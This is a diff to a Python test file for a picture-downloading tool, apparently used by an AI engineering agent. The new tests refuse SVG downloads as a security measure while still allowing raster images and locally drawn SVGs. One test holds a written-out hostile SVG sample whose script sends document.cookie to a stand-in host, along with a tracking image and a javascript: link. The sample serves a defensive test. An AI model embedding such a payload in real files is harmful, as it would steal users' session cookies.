@@ -22,6 +22,7 @@ _the_right_question` pins the request this builds without making it.
 """
 
 import inspect
+import json
 import socket
 import tempfile
 import urllib.error
@@ -287,12 +288,12 @@ class TestOnlyWhatItSaysItIs:
         assert "NOT FETCHED" in said(capsys)
 
     def test_what_may_be_downloaded_is_a_named_list(self):
+        """Raster only. The vector omission has its own class below."""
         assert set(outside.PICTURES) == {
             "image/jpeg",
             "image/png",
             "image/webp",
             "image/gif",
-            "image/svg+xml",
         }
 
     def test_what_may_be_read_is_a_named_list(self):
@@ -666,3 +667,144 @@ class TestTheRequestItBuilds:
 
     def test_it_says_who_it_is(self):
         assert "drydock" in outside.AGENT
+
+
+class TestAnSvgIsADocumentRatherThanAPicture:
+    """Downloading one is off. Writing one is not.
+
+    An SVG can carry `<script>`, a `javascript:` href, an `onload`, a
+    `<foreignObject>` of arbitrary markup, and an `<image href="https://...">`
+    that fetches on every page view. It arrives as text and goes into the
+    repository past a diff somebody skims. Sanitising it properly is a
+    parser and a denylist that has to be right every time against a format
+    designed to be extensible, and nothing here needs that: the thing an
+    SVG is wanted for is a drawing, and the engineer can write one.
+    """
+
+    def _answer(self, monkeypatch, kind, body=b"<svg/>"):
+        monkeypatch.setattr(
+            outside,
+            "_ask",
+            lambda u, c, a: outside.Answer(url=u, kind=kind, body=body),
+        )
+        monkeypatch.setattr(outside, "_terms", lambda url: ("CC0", "nobody"))
+
+    @pytest.mark.parametrize("kind", ["image/svg+xml", "image/svg"])
+    def test_it_is_refused(self, kind, project, monkeypatch, capsys):
+        self._answer(monkeypatch, kind)
+        outside.get("https://example.com/a.svg", "art/a.svg", project)
+        out = said(capsys)
+        assert "NOT FETCHED" in out
+        assert "an SVG is not downloaded here" in out
+
+    def test_nothing_is_written(self, project, monkeypatch, capsys):
+        self._answer(monkeypatch, "image/svg+xml")
+        outside.get("https://example.com/a.svg", "art/a.svg", project)
+        assert not (project / "art" / "a.svg").exists()
+        assert not (project / outside.CREDITS).exists()
+
+    def test_a_hostile_one_never_lands(self, project, monkeypatch, capsys):
+        """The shape of the thing this refuses, written out so the
+        refusal is not mistaken for tidiness."""
+        hostile = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b'<script>fetch("https://elsewhere.test/?"+document.cookie)</script>'
+            b'<image href="https://elsewhere.test/pixel.png"/>'
+            b'<a href="javascript:alert(1)"><text>click</text></a>'
+            b"</svg>"
+        )
+        self._answer(monkeypatch, "image/svg+xml", hostile)
+        outside.get("https://example.com/a.svg", "a.svg", project)
+        assert not (project / "a.svg").exists()
+        assert b"script" not in b"".join(
+            p.read_bytes() for p in project.rglob("*") if p.is_file()
+        )
+
+    def test_renaming_it_does_not_get_it_in(self, project, monkeypatch, capsys):
+        """The content type decides, not the name the worker asked for."""
+        self._answer(monkeypatch, "image/svg+xml")
+        outside.get("https://example.com/a.svg", "art/looks-like.png", project)
+        assert "an SVG is not downloaded here" in said(capsys)
+        assert not (project / "art" / "looks-like.png").exists()
+
+    def test_it_is_not_in_what_may_be_downloaded(self):
+        assert "image/svg+xml" not in outside.PICTURES
+        assert outside.NOT_DOWNLOADED == {"image/svg+xml", "image/svg"}
+
+    def test_the_refusal_says_to_draw_one_instead(self, project, monkeypatch, capsys):
+        self._answer(monkeypatch, "image/svg+xml")
+        outside.get("https://example.com/a.svg", "a.svg", project)
+        out = said(capsys)
+        assert "Draw the one you need instead" in out
+        assert "writing it is not restricted" in out
+
+    def test_a_raster_picture_still_arrives(self, project, monkeypatch, capsys):
+        """The capability is narrowed, not removed."""
+        self._answer(monkeypatch, "image/png", b"\x89PNG")
+        outside.get("https://example.com/a.png", "art/a.png", project)
+        assert (project / "art" / "a.png").exists()
+
+    def test_a_search_does_not_offer_what_get_refuses(
+        self, project, monkeypatch, capsys
+    ):
+        found = {
+            "query": {
+                "pages": {
+                    "1": {
+                        "title": "File:A drawing.svg",
+                        "imageinfo": [
+                            {
+                                "mime": "image/svg+xml",
+                                "url": "https://x/a.svg",
+                                "width": 10,
+                                "height": 10,
+                                "extmetadata": {},
+                            }
+                        ],
+                    },
+                    "2": {
+                        "title": "File:A photograph.jpg",
+                        "imageinfo": [
+                            {
+                                "mime": "image/jpeg",
+                                "url": "https://x/b.jpg",
+                                "width": 100,
+                                "height": 80,
+                                "extmetadata": {},
+                            }
+                        ],
+                    },
+                }
+            }
+        }
+        monkeypatch.setattr(
+            outside,
+            "_ask",
+            lambda u, c, a: outside.Answer(
+                url=u, kind="application/json", body=json.dumps(found).encode()
+            ),
+        )
+        outside.find(["anything"])
+        out = said(capsys)
+        assert "A photograph.jpg" in out
+        assert "A drawing.svg" not in out
+
+    def test_a_locally_written_svg_is_untouched(self, project, capsys):
+        """`have` still counts one, and nothing deletes or rewrites it."""
+        (project / "art").mkdir()
+        drawn = project / "art" / "mark.svg"
+        drawn.write_text('<svg viewBox="0 0 120 60"><path d="M0 0"/></svg>')
+        outside.have(project)
+        out = said(capsys)
+        assert "art/mark.svg" in out
+        assert "120x60" in out
+        assert drawn.read_text().startswith("<svg")
+
+    def test_the_skill_still_tells_the_engineer_to_draw(self):
+        from drydock.skills import discover, load
+
+        for s in discover(Path("skills")):
+            if s.name == "web-design":
+                text = flat((load(s).sections or {})["engineer"])
+        assert "**You can draw it**" in text
+        assert "an SVG you write is a real asset" in text
